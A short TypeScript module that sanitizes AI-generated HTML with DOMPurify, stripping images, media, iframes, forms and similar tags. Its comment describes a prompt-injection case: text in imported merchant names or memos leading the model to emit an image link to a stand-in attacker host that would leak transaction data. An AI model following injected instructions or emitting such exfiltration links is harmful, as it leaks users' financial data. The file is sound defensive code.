import DOMPurify from 'dompurify';

// AI replies are model output, and the model reads text the user didn't write
// (merchant names, transfer memos from an imported statement). A prompt-injected
// line could make it emit ![](https://attacker/?d=<transactions>) and the
// browser would fetch that URL — sending the data out. Replies are text and
// lists, so images and other active/embedded content are dropped (C11).
export const sanitizeAiHtml = (html: string): string =>
  DOMPurify.sanitize(html, {
    FORBID_TAGS: ['img', 'picture', 'source', 'video', 'audio', 'iframe', 'object', 'embed', 'form', 'input', 'style', 'svg', 'math'],
    FORBID_ATTR: ['style', 'srcset'],
  });
